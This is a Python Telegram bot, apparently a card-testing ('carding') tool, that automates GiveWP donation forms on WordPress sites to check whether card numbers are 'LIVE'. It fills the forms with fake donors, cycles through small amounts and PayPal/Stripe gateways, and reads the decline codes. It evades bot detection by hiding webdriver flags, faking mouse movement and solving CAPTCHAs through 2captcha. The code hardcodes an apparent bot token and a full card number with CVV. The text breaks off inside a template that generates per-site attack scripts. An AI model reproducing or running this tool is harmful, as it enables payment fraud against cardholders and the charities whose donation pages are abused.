#!/usr/bin/env python3
"""GiveWP Bot v28 — Complete Single File"""
import os, sys, asyncio, json, re, time, random, threading, base64, traceback
from datetime import datetime
from io import BytesIO
from urllib.parse import urlparse

os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc")
OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
ADMINS = [str(OWNER_ID)]
TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")
TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "")
PROXY_URL = os.environ.get("PROXY_URL", "")

if not BOT_TOKEN or ":" not in BOT_TOKEN:
    print("❌ BOT_TOKEN invalid"); sys.exit(1)

import telebot
from telebot import types
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings()

try:
    from playwright.async_api import async_playwright
    HAS_PW = True
except ImportError:
    HAS_PW = False

try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    def rua():
        try: return _UA.random
        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"
except:
    def rua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

waiting_users = {}
reply_mode = {}
processing_status = {}
if not os.path.exists("blockusers.txt"): open("blockusers.txt", "w").close()

PAYPAL_META = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
FIRST = ["James","John","Robert","Michael","William","David"]
LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia"]
CITIES = ["New York","Los Angeles","Chicago","Houston"]
STATES = ["NY","CA","IL","TX"]
ZIPS = ["10001","90001","60601","77001"]
STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd"]
AMOUNTS = ["5","10","20","25","50","100","1","2","3"]
GATEWAYS = ["paypal-commerce","paypal","paypal_standard","give_paypal"]


def safe_send(cid, text, markup=None, retries=3):
    for i in range(retries):
        try: return bot.send_message(cid, text, reply_markup=markup)
        except Exception as e:
            if "429" in str(e):
                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(w, 60))
            else: break
    return None

def safe_edit(cid, mid, text, retries=3):
    for i in range(retries):
        try: return bot.edit_message_text(chat_id=cid, message_id=mid, text=text)
        except Exception as e:
            if "429" in str(e):
                w = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(w, 60))
            else: break
    return None

def safe_doc(cid, data, fn, cap=""):
    try: return bot.send_document(cid, (fn, BytesIO(data)), caption=cap)
    except: return None

def is_blocked(uid):
    try:
        with open("blockusers.txt") as f: return str(uid) in f.read().splitlines()
    except: return False


class Cls:
    PAYPAL = {
        "CHARGE_SUCCESS": ["success","approved","charged","completed","thank you",
                           "payment successful","donation complete","status\":\"COMPLETED"],
        "ORDER_NOT_APPROVED": ["order_not_approved","not yet approved"],
        "PAYER_CANNOT_PAY": ["payer cannot pay","cannot pay for this transaction","payee blocked"],
        "INSUFFICIENT_FUNDS": ["insufficient","not enough","nsf"],
        "DO_NOT_HONOR": ["do not honor","do_not_honor"],
        "ACCOUNT_CLOSED": ["account closed","account_closed"],
        "LOST_OR_STOLEN": ["lost or stolen","lost_or_stolen"],
        "CVV2_FAILURE": ["cvv2","cvv failure","security code"],
        "CVV_FAILURE": ["cvv_failure"],
        "SUSPECTED_FRAUD": ["suspected fraud","suspected_fraud"],
        "GENERIC_DECLINE": ["generic decline"],
        "RESTRICTED_OR_INACTIVE_ACCOUNT": ["restricted","inactive"],
        "INVALID_OR_RESTRICTED_CARD": ["invalid or restricted"],
        "EXPIRED_CARD": ["expired card","expired_card","card expired"],
        "AUTHENTICATION_REQUIRED": ["authentication required","3d secure"],
        "PAYER_ACTION_REQUIRED": ["payer action required"],
        "TX_ATTEMPTS_EXCEED_LIMIT": ["attempts exceed","limit exceeded"],
        "SECURITY_VIOLATION": ["security violation"],
        "COMPLIANCE_VIOLATION": ["compliance violation"],
        "TRANSACTION_NOT_PERMITTED": ["transaction not permitted"],
        "PAYMENT_DENIED": ["payment denied"],
        "APPROVED_PENDING_CAPTURE": ["pending capture","paypal orders are captured"],
        "INVALID_ACCOUNT": ["invalid account"],
        "REATTEMPT_NOT_PERMITTED": ["reattempt not permitted"],
        "ACCOUNT_BLOCKED_BY_ISSUER": ["blocked by issuer"],
        "PICKUP_CARD_SPECIAL_CONDITIONS": ["pickup card"],
        "INVALID_TRANSACTION": ["invalid transaction"],
        "CRYPTOGRAPHIC_FAILURE": ["cryptographic failure"],
        "TRANSACTION_CANNOT_BE_COMPLETED": ["cannot be completed"],
        "DECLINED_PLEASE_RETRY": ["declined please retry"],
        "INSTRUMENT_DECLINED": ["instrument_declined"],
        "REDIRECT_PAYER_FOR_ALTERNATE_FUNDING": ["redirect payer"],
    }
    STRIPE = {
        "STRIPE_INSUFFICIENT_FUNDS": ["insufficient_funds"],
        "STRIPE_GENERIC_DECLINE": ["generic_decline"],
        "STRIPE_EXPIRED_CARD": ["expired_card"],
        "STRIPE_FRAUDULENT": ["fraudulent"],
        "STRIPE_LOST_CARD": ["lost_card"],
        "STRIPE_STOLEN_CARD": ["stolen_card"],
        "STRIPE_RESTRICTED_CARD": ["restricted_card"],
        "STRIPE_PICKUP_CARD": ["pickup_card"],
        "STRIPE_INCORRECT_CVC": ["incorrect_cvc","invalid_cvc"],
        "STRIPE_INCORRECT_NUMBER": ["incorrect_number","invalid_number"],
        "STRIPE_INCORRECT_ZIP": ["incorrect_zip"],
        "STRIPE_DO_NOT_HONOR": ["do_not_honor"],
        "STRIPE_CARD_VELOCITY_EXCEEDED": ["card_velocity_exceeded"],
        "STRIPE_SECURITY_VIOLATION": ["security_violation"],
        "STRIPE_PROCESSING_ERROR": ["processing_error"],
        "STRIPE_AUTHENTICATION_REQUIRED": ["authentication_required"],
    }
    DEAD = {
        "CLOUDFLARE": ["just a moment","checking your browser","verifying you are","cf-browser-verification"],
        "CAPTCHA": ["captcha","not a robot","recaptcha","hcaptcha","turnstile"],
        "GATEWAY_DISABLED": ["gateway is not enabled","payment gateway is not"],
        "FORM_NOT_PUBLISHED": ["form not published"],
        "SPAM": ["flagged as spam"],
        "NO_FORM": ["form not found","no donation form"],
        "NO_PAYPAL": ["paypal not available"],
        "PAYPAL_ORDER_MISSING": ["paypal order id is missing","order id is missing"],
        "SUCCESS_FALSE": ["\"success\":false"],
    }

    @classmethod
    def classify(cls, text):
        if not text: return "DEAD", "EMPTY"
        up = text.upper(); low = text.lower()
        try:
            js = json.loads(text)
            s = js.get("success")
            if s is True: return "LIVE", "CHARGE_SUCCESS"
            if s is False:
                err = json.dumps(js.get("data", {}), ensure_ascii=False).upper()
                for code, kws in cls.PAYPAL.items():
                    for kw in kws:
                        if kw.upper() in err: return "LIVE", code
                return "DEAD", "SUCCESS_FALSE"
        except: pass
        for code, kws in cls.PAYPAL.items():
            for kw in kws:
                if kw in low: return "LIVE", code
        for code, kws in cls.STRIPE.items():
            for kw in kws:
                if kw in low: return "LIVE", code
        for code, kws in cls.DEAD.items():
            for kw in kws:
                if kw in low: return "DEAD", code
        return "UNKNOWN", "UNKNOWN"


class PW:
    def __init__(self, url, card):
        self.url = url; self.card = card
        self.debug = {"steps":[],"network":[],"paypal":[],"stripe":[],"amount":None,
                      "form":None,"pp_frame":False,"card_filled":False,"captcha":False,
                      "cloudflare":False,"extracted":{},"raw":"","platform":"unknown",
                      "order_id":None}

    def log(self, m): self.debug["steps"].append(m)

    async def _on_resp(self, resp):
        try:
            u = resp.url; body = ""
            if any(k in u for k in ["create_order","confirm-payment","approve_order",
                                     "admin-ajax.php","give_process","paypal.com/v2","api.stripe.com"]):
                try: body = await resp.text()
                except: pass
                self.debug["network"].append({"url":u[:150],"status":resp.status,"body":body[:2000]})
                if "create_order" in u:
                    try:
                        js = json.loads(body)
                        if isinstance(js.get("data"),dict) and js["data"].get("id"):
                            self.debug["order_id"] = js["data"]["id"]
                    except: pass
                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                    self.debug["paypal"].append(body[:2000])
                    self.debug["raw"] = body[:2000]
                if "stripe" in u.lower():
                    self.debug["stripe"].append(body[:2000])
        except: pass

    async def run(self):
        if not HAS_PW: return self._err("NO_PW")
        try:
            async with async_playwright() as p:
                proxy = None
                if PROXY_URL:
                    px = urlparse(PROXY_URL)
                    if px.username and px.password:
                        proxy = {"server":f"{px.scheme}://{px.hostname}:{px.port}",
                                 "username":px.username,"password":px.password}
                    else:
                        proxy = {"server": PROXY_URL}
                browser = await p.chromium.launch(headless=True, proxy=proxy,
                    args=["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage",
                          "--disable-gpu","--single-process","--no-zygote",
                          "--disable-blink-features=AutomationControlled","--ignore-certificate-errors"])
                try:
                    ctx = await browser.new_context(user_agent=rua(),
                        viewport={"width":1366,"height":900}, locale="en-US",
                        timezone_id="America/New_York", ignore_https_errors=True)
                    await ctx.add_init_script("""
                        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                        window.chrome={runtime:{}};
                    """)
                    page = await ctx.new_page()
                    page.on("response", self._on_resp)
                    return await self._exec(page)
                finally:
                    try: await browser.close()
                    except: pass
        except Exception as e:
            return self._err(f"LAUNCH: {str(e)[:100]}")

    def _err(self, code):
        return {"status":"DEAD","code":code,"raw":"","debug":self.debug}

    async def _exec(self, page):
        try:
            self.log("[1] goto")
            try: await page.goto(self.url, wait_until="domcontentloaded", timeout=30000)
            except: pass
            await asyncio.sleep(2)

            html = await page.content()
            if any(x in html.lower() for x in ["just a moment","verifying you are"]):
                self.debug["cloudflare"] = True
                self.log("[2] cf")
                await self._human(page)
                for _ in range(5):
                    await asyncio.sleep(5); html = await page.content()
                    if "just a moment" not in html.lower(): break
                else: return self._err("CLOUDFLARE")

            if any(x in html.lower() for x in ["g-recaptcha","hcaptcha","turnstile"]):
                self.debug["captcha"] = True
                self.log("[3] captcha")
                await self._solve_captcha(page, html)

            self.debug["platform"] = self._platform(html)
            self.debug["extracted"] = self._ext(html)

            self.log("[6] form")
            form = await self._find_form(page)
            if not form: return self._err("NO_FORM")
            self.debug["form"] = form
            self.log(f"[6] {form}")

            await self._human(page)
            self.log("[8] fill")
            await self._fill(page)

            self.log("[9] amount")
            amt = await self._amount(page)
            self.debug["amount"] = amt

            await self._terms(page)

            self.log("[11] donate")
            if not await self._donate(page): return self._err("NO_DONATE")
            await asyncio.sleep(3)

            self.log("[12] pp")
            pp = await self._wait_pp(page, 20)
            if not pp:
                t = await page.inner_text("body")
                st, cd = Cls.classify(t)
                return {"status":st,"code":cd,"raw":t[:2000],"debug":self.debug}
            self.debug["pp_frame"] = True

            self.log("[13] card")
            if not await self._card(pp): return self._err("CARD_FAIL")
            self.debug["card_filled"] = True

            self.log("[14] submit")
            await self._submit(pp, page)
            await asyncio.sleep(5)

            return await self._read(page, pp)
        except Exception as e:
            return self._err(f"EXEC: {str(e)[:120]}")

    async def _human(self, page):
        try:
            for _ in range(2):
                await page.mouse.move(random.randint(100,1000), random.randint(100,700))
                await asyncio.sleep(0.2)
            await page.mouse.wheel(0, random.randint(200,500))
            await asyncio.sleep(0.3)
        except: pass

    def _platform(self, html):
        low = html.lower()
        if "give-form" in low or "give-amount" in low: return "givewp"
        if "woocommerce" in low or "wc-ajax" in low: return "woocommerce"
        if "stripe.com/v3" in low or "js.stripe.com" in low: return "stripe"
        if "paypal.com/sdk" in low: return "paypal"
        return "unknown"

    def _ext(self, html):
        info = {}
        for k, pat in [("form_id",r'name="give-form-id"\s*value="([^"]*)"'),
                       ("nonce",r'name="give-form-hash"\s*value="([^"]*)"'),
                       ("min",r'name="give-form-minimum"\s*value="([^"]*)"'),
                       ("price_id",r'name="give-price-id"\s+value="([^"]*)"')]:
            m = re.search(pat, html)
            if m: info[k] = m.group(1)
        return info

    async def _find_form(self, page):
        sels = ["form.give-form","form[id*='give-form']","form[class*='give-form']",
                ".give-form-wrap form","input[name='give-amount']","input[name='give-form-id']",
                "input[name='give-form-hash']","form[id*='give']","button.give-submit",
                "input.give-submit"]
        for attempt in range(15):
            for sel in sels:
                try:
                    if await page.locator(sel).first.count() > 0: return "main"
                except: continue
            if attempt < 14: await asyncio.sleep(1)
        for fr in page.frames:
            if fr == page.main_frame: continue
            for sel in sels:
                try:
                    if await fr.locator(sel).count() > 0: return "iframe"
                except: continue
        try:
            shadow = await page.evaluate("""()=>{const r=[];const s=(root)=>{if(!root)return;
                root.querySelectorAll('form,[id*="give"]').forEach(f=>{if(f.querySelector('input[name*="give"],input[name*="amount"]'))r.push(f.id||'s')});
                root.querySelectorAll('*').forEach(el=>{if(el.shadowRoot)s(el.shadowRoot)});};s(document);return r;}""")
            if shadow: return "shadow"
        except: pass
        for _ in range(3):
            await page.mouse.wheel(0, 500); await asyncio.sleep(1)
        for sel in sels:
            try:
                if await page.locator(sel).first.count() > 0: return "post-scroll"
            except: continue
        try:
            for f in await page.locator("form").all():
                if await f.locator("input").count() >= 2: return "fallback"
        except: pass
        return None

    async def _fill(self, page):
        first = random.choice(FIRST); last = random.choice(LAST)
        email = f"u{int(time.time()*1000)%999999}@gmail.com"
        street = random.choice(STREETS); city = random.choice(CITIES)
        state = random.choice(STATES); zp = random.choice(ZIPS)
        phone = f"555{random.randint(1000000,9999999)}"
        hints = {'first':first,'given':first,'fname':first,'last':last,'family':last,
                 'surname':last,'email':email,'mail':email,'address':street,'street':street,
                 'city':city,'town':city,'state':state,'province':state,'zip':zp,'postal':zp,
                 'postcode':zp,'phone':phone,'tel':phone,'name':f"{first} {last}"}
        for fr in page.frames:
            try:
                for inp in await fr.locator("input").all():
                    try:
                        t = await inp.get_attribute("type") or "text"
                        if t not in ("text","email","tel","url","number"): continue
                        if not await inp.is_visible(timeout=100): continue
                        if await inp.input_value(): continue
                        key = ((await inp.get_attribute("name") or "") + "|" +
                               (await inp.get_attribute("id") or "") + "|" +
                               (await inp.get_attribute("placeholder") or "")).lower()
                        for h,v in hints.items():
                            if h in key:
                                await inp.fill(v); break
                        else:
                            if t == "email": await inp.fill(email)
                            elif t == "tel": await inp.fill(phone)
                    except: continue
                for sel in await fr.locator("select").all():
                    try:
                        if not await sel.is_visible(timeout=100): continue
                        cur = await sel.input_value()
                        if cur and cur not in ("","0","-1"): continue
                        sn = (await sel.get_attribute("name") or "").lower()
                        if 'country' in sn:
                            for v in ['US','United States']:
                                try: await sel.select_option(v); break
                                except: continue
                        elif 'state' in sn:
                            try: await sel.select_option(state)
                            except:
                                try: await sel.select_option(index=1)
                                except: pass
                        else:
                            for o in await sel.locator("option").all():
                                v = await o.get_attribute("value")
                                if v and v not in ("","0","-1"):
                                    try: await sel.select_option(v); break
                                    except: continue
                    except: continue
            except: continue

    async def _amount(self, page):
        for amt in AMOUNTS:
            for fr in page.frames:
                try:
                    btn = fr.locator(f"[data-price='{amt}'],[data-price='{amt}.00'],[data-amount='{amt}']").first
                    if await btn.count() > 0:
                        await btn.scroll_into_view_if_needed()
                        try: await btn.click(timeout=2000)
                        except: await btn.click(force=True, timeout=2000)
                        return amt
                except: continue
                try:
                    btn = fr.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
                    if await btn.count() > 0:
                        await btn.click(timeout=2000); return amt
                except: continue
                try:
                    r = fr.locator(f"input[type='radio'][value='{amt}'],[value='{amt}.00']").first
                    if await r.count() > 0:
                        await r.check(force=True); return amt
                except: continue
                try:
                    lbl = fr.locator(f"label:has-text('${amt}')").first
                    if await lbl.count() > 0:
                        await lbl.click(timeout=1500); return amt
                except: continue
        for fr in page.frames:
            for sel in ["input[name='give-amount']","input[name*='amount'][type='text']",
                        "input[id*='amount']"]:
                try:
                    inp = fr.locator(sel).first
                    if await inp.count() > 0 and await inp.is_visible(timeout=200):
                        if not (await inp.input_value()) or await inp.input_value() == "0":
                            await inp.fill("5"); return "5"
                except: continue
        return None

    async def _terms(self, page):
        for fr in page.frames:
            try:
                for cb in await fr.locator("input[type='checkbox']").all():
                    try:
                        key = ((await cb.get_attribute("name") or "") + "|" +
                               (await cb.get_attribute("id") or "")).lower()
                        if any(k in key for k in ['terms','agree','accept','condition','privacy','consent']):
                            if not await cb.is_checked():
                                try: await cb.check(force=True)
                                except:
                                    try: await cb.click(force=True)
                                    except: pass
                    except: continue
            except: continue

    async def _donate(self, page):
        sels = ["button.give-submit","input.give-submit","button[type='submit'][class*='give']",
                "button[id*='donate' i]","button[name*='donate' i]",
                "input[type='submit'][value*='Donate' i]",
                "button:has-text('Donate')","button:has-text('Give')",
                "button:has-text('Submit')","button:has-text('Pay')",
                "button:has-text('Continue')","button[type='submit']","input[type='submit']"]
        for fr in page.frames:
            for sel in sels:
                try:
                    btn = fr.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        await btn.scroll_into_view_if_needed()
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        return True
                except: continue
        return False

    async def _wait_pp(self, page, timeout=20):
        for _ in range(timeout*2):
            for fr in page.frames:
                if fr == page.main_frame: continue
                if any(k in fr.url.lower() for k in ["paypal","braintree","card","stripe"]):
                    try:
                        if await fr.locator("input").count() > 0: return fr
                    except: continue
            try:
                if await page.locator("input[autocomplete='cc-number'],input[name*='cardnumber']").first.count() > 0:
                    return page
            except: pass
            await page.wait_for_timeout(400)
        return None

    async def _card(self, frame):
        try:
            p = self.card.strip().split("|")
            n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            await asyncio.sleep(1.5)
            all_fr = [frame]
            try:
                for f in frame.frames: all_fr.append(f)
            except: pass
            async def fill(sels, val):
                for fr in all_fr:
                    for sel in sels:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                await loc.click(timeout=800)
                                await loc.fill("", timeout=800)
                                for ch in str(val): await loc.type(ch, delay=20)
                                return True
                        except: continue
                return False
            await fill(["input[type='email']","input[name*='email']"],
                       f"u{int(time.time()*1000)%999999}@gmail.com")
            if not await fill(["input#credit-card-number","input[name='cardnumber']",
                               "input[autocomplete='cc-number']","input[placeholder*='Card' i]",
                               "input[inputmode='numeric']"], n): return False
            await asyncio.sleep(0.4)
            exp = await fill(["input#expiration-date","input[name='exp']",
                              "input[autocomplete='cc-exp']",
                              "input[placeholder*='MM / YY' i]"], f"{mm}/{yy}")
            if not exp:
                for fr in all_fr:
                    for sel in ["select[name='expiration-month']","input[name='expiration-month']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(mm)
                                    except: pass
                                else: await loc.fill(mm)
                                break
                        except: continue
                for fr in all_fr:
                    for sel in ["select[name='expiration-year']","input[name='expiration-year']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(f"20{yy}")
                                    except: pass
                                else: await loc.fill(yy)
                                break
                        except: continue
            await asyncio.sleep(0.4)
            await fill(["input#cvv","input#cvc","input[name='cvv']",
                        "input[name='securityCode']","input[autocomplete='cc-csc']",
                        "input[placeholder*='CVV' i]"], cvc)
            await asyncio.sleep(0.4)
            return True
        except: return False

    async def _submit(self, frame, page):
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            for kw in ['Pay','Continue','Complete','Confirm','Submit']:
                try:
                    btn = fr.locator(f"button:has-text('{kw}')").first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        return True
                except: continue
            try:
                btn = fr.locator("button[type='submit']").first
                if await btn.count() > 0 and await btn.is_visible(timeout=300):
                    try: await btn.click(timeout=3000)
                    except: await btn.click(force=True, timeout=3000)
                    return True
            except: continue
        return False

    async def _read(self, page, frame):
        for body in self.debug["paypal"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
            if cd == "PAYPAL_ORDER_MISSING": return {"status":"DEAD","code":cd,"raw":body[:2000],"debug":self.debug}
        for body in self.debug["stripe"]:
            st, cd = Cls.classify(body)
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":body[:2000],"debug":self.debug}
        for net in self.debug["network"]:
            st, cd = Cls.classify(net.get("body",""))
            if st == "LIVE": return {"status":"LIVE","code":cd,"raw":net["body"][:2000],"debug":self.debug}
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            try:
                t = await fr.inner_text("body")
                if t:
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
            except: continue
        try:
            for fr in [frame, page.main_frame]:
                if not fr: continue
                for a in await fr.locator("[role='alert'],.give_error,.error").all():
                    t = await a.inner_text()
                    st, cd = Cls.classify(t)
                    if st == "LIVE": return {"status":"LIVE","code":cd,"raw":t[:2000],"debug":self.debug}
        except: pass
        if self.debug.get("raw"):
            st, cd = Cls.classify(self.debug["raw"])
            return {"status":st,"code":cd,"raw":self.debug["raw"][:2000],"debug":self.debug}
        return {"status":"UNKNOWN","code":"NO_RESPONSE","raw":"","debug":self.debug}

    async def _solve_captcha(self, page, html):
        if not TWOCAPTCHA_KEY: return False
        try:
            m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if not m: m = re.search(r'sitekey["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
            if not m: return False
            sitekey = m.group(1)
            r = requests.post("https://2captcha.com/in.php", data={
                "key":TWOCAPTCHA_KEY,"method":"userrecaptcha","googlekey":sitekey,
                "pageurl":self.url,"json":1}, timeout=30).json()
            if r.get("status") != 1: return False
            task_id = r["request"]
            for _ in range(30):
                await asyncio.sleep(5)
                res = requests.get(f"https://2captcha.com/res.php?key={TWOCAPTCHA_KEY}&action=get&id={task_id}&json=1", timeout=30).json()
                if res.get("status") == 1:
                    token = res["request"]
                    await page.evaluate(f"""()=>{{const el=document.querySelector('[name="g-recaptcha-response"]');if(el)el.value="{token}";}}""")
                    return True
            return False
        except: return False


class ReqEngine:
    def __init__(self, url, card):
        self.url = url; self.card = card
        self.r = requests.Session(); self.r.verify = False
        p = urlparse(url)
        self.host = p.netloc
        self.path = p.path + ("?" + p.query if p.query else "")
        self.base = f"https://{self.host}"
        self.ajax = f"{self.base}/wp-admin/admin-ajax.php"
        self.form1 = None; self.form2 = None; self.nonce = None
        self.min_amt = None; self.price_id = "3"
        self.access_token = None; self.client_token = None
        self.fields = {}; self.levels = []; self.gateways = []
        self.captcha = False
        self.debug = {"attempts":[],"raw":"","extracted":{}}

    def _get(self):
        try:
            r = self.r.get(self.url, headers={"user-agent":rua()}, timeout=25, cookies=self.r.cookies)
            html = r.text or ""
            self.r.cookies.update(r.cookies)
            if len(html) < 100: return ""
            if "give-form-id-prefix" not in html or "give-form-hash" not in html:
                for pat in [r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
                            r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                            r'<iframe[^>]*src="([^"]*donation[^"]*)"']:
                    m = re.search(pat, html, re.IGNORECASE)
                    if m:
                        iurl = m.group(1)
                        if iurl.startswith("//"): iurl = "https:" + iurl
                        elif iurl.startswith("/"): iurl = f"{self.base}{iurl}"
                        r2 = self.r.get(iurl, headers={"user-agent":rua()}, timeout=25, cookies=self.r.cookies)
                        self.r.cookies.update(r2.cookies)
                        html = r2.text or ""
                        break
            return html
        except: return ""

    def _extract(self, html):
        m = re.search(r'name="give-form-id-prefix"\s*value="([^"]*)"', html)
        if m: self.form1 = m.group(1)
        m = re.search(r'name="give-form-id"\s*value="([^"]*)"', html)
        if m: self.form2 = m.group(1)
        m = re.search(r'name="give-form-hash"\s*value="([^"]*)"', html)
        if m: self.nonce = m.group(1)
        m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', html)
        if m and m.group(1).strip(): self.min_amt = m.group(1).strip()
        m = re.search(r'name="give-price-id"\s+value="([^"]*)"', html)
        if m: self.price_id = m.group(1)
        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html):
            tag = m.group(0)
            nm = re.search(r'name=["\']([^"\']+)["\']', tag)
            v = re.search(r'value=["\']([^"\']*)["\']', tag)
            if nm: self.fields[nm.group(1)] = v.group(1) if v else ""
        for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', html, re.DOTALL):
            name = m.group(1)
            opts = re.findall(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2))
            valid = [o for o in opts if o and o not in ("","0","-1")]
            if valid: self.fields[name] = valid[0]
        for m in re.finditer(r'<input[^>]*type=["\']checkbox["\'][^>]*>', html):
            tag = m.group(0)
            nm = re.search(r'name=["\']([^"\']+)["\']', tag)
            if nm and any(k in nm.group(1).lower() for k in ["terms","agree","accept"]):
                self.fields[nm.group(1)] = "on"
        for pat, pg, ag in [(r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1, 2),
                            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2, 1)]:
            for m in re.finditer(pat, html):
                try: self.levels.append((m.group(pg), m.group(ag)))
                except: pass
        for m in re.finditer(r'name=["\']give-gateway["\'][^>]*value=["\']([^"\']+)["\']', html):
            self.gateways.append(m.group(1))
        if "g-recaptcha" in html or "hcaptcha" in html: self.captcha = True
        for pat in [r'"data-client-token"\s*:\s*"([^"]+)"', r'"accessToken"\s*:\s*"([^"]{20,})"']:
            m = re.search(pat, html)
            if m:
                try:
                    enc = m.group(1)
                    if "client-token" in pat:
                        dec = base64.b64decode(enc).decode("utf-8", errors="ignore")
                        au = re.search(r'"accessToken":"([^"]+)"', dec)
                        if au: self.access_token = au.group(1)
                        else: self.client_token = enc
                    else: self.access_token = enc
                except: pass
        self.debug["extracted"] = {"form1":self.form1,"form2":self.form2,
                                    "nonce":bool(self.nonce),"token":bool(self.access_token),
                                    "levels":len(self.levels),"gateways":self.gateways}
        return bool(self.form1 and self.nonce)

    def _build(self, gw, amt, pid, inc=True):
        base = {"give-honeypot":"","give-form-id-prefix":self.form1 or "",
                "give-form-id":self.form2 or "","give-form-title":"",
                "give-current-url":self.url,"give-form-url":self.url,
                "give-form-minimum":self.min_amt or "","give-form-maximum":"999999.99",
                "give-form-hash":self.nonce or "","give-price-id":pid,
                "payment-mode":gw,"give_first":random.choice(FIRST),
                "give_last":random.choice(LAST),
                "give_email":f"u{random.randint(1000,99999)}@gmail.com",
                "card_name":"Test Bot","give-gateway":gw}
        if inc: base["give-amount"] = amt
        for k, v in self.fields.items():
            if k not in base: base[k] = v
        if self.captcha: base["g-recaptcha-response"] = ""
        return MultipartEncoder({k:(None,v) for k,v in base.items()})

    def charge(self, cc):
        html = self._get()
        if not html: return {"status":"DEAD","code":"GET_FAILED","debug":self.debug}
        if not self._extract(html): return {"status":"DEAD","code":"FORM_NOT_FOUND","debug":self.debug}
        attempts = []
        for pid, amt in self.levels: attempts.append((pid, amt, True))
        if self.min_amt: attempts.append(("custom", self.min_amt, True))
        for a in AMOUNTS[:6]: attempts.append(("custom", a, True))
        attempts.append(("custom", "", True))
        gateways = self.gateways or GATEWAYS
        for gw in gateways:
            for pid, amt, inc in attempts:
                data = self._build(gw, amt, pid, inc)
                headers = {"content-type":data.content_type,"origin":self.base,
                           "referer":self.url,"user-agent":rua(),
                           "x-requested-with":"XMLHttpRequest"}
                try:
                    r = self.r.post(self.ajax, params={"action":"give_process_donation"},
                                    headers=headers, data=data, cookies=self.r.cookies, timeout=25)
                    self.debug["attempts"].append({"gw":gw,"amt":amt,"pid":pid,
                                                    "status":r.status_code,"body":r.text[:1500]})
                    st, cd = Cls.classify(r.text)
                    if st == "LIVE":
                        return {"status":"LIVE","code":cd,"raw":r.text[:2000],"debug":self.debug}
                except: continue
        if self.debug["attempts"]:
            self.debug["raw"] = self.debug["attempts"][-1]["body"]
        return {"status":"DEAD","code":"ALL_FAILED","raw":"","debug":self.debug}


def check(url, card):
    if HAS_PW:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                eng = PW(url, card)
                r = loop.run_until_complete(eng.run())
                if r["status"] in ("LIVE","UNKNOWN"): return r
                if r["status"] == "DEAD" and r["code"] not in (
                    "CLOUDFLARE","CAPTCHA","GATEWAY_DISABLED","FORM_NOT_PUBLISHED"):
                    req = ReqEngine(url, card)
                    r2 = req.charge(card)
                    if r2["status"] == "LIVE": return r2
                    return r
                return r
            finally: loop.close()
        except Exception as e:
            try: return ReqEngine(url, card).charge(card)
            except: return {"status":"DEAD","code":"ALL_FAILED","debug":{}}
    else:
        return ReqEngine(url, card).charge(card)


GATE_TPL = '''"""Gate: {domain} | Form: {form_id} | Amount: {amount}"""
import requests, re, base64, json, random
from requests_toolbelt.multipart.encoder import MultipartEncoder

META = "{meta}"
SDK = "{sdk}"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"


class PayPal:
    def __init__(self):
        self.url = "{url}"
        self.host = "{host}"
        self.path = "{path}"
        self.base = f"https://{{self.host}}"
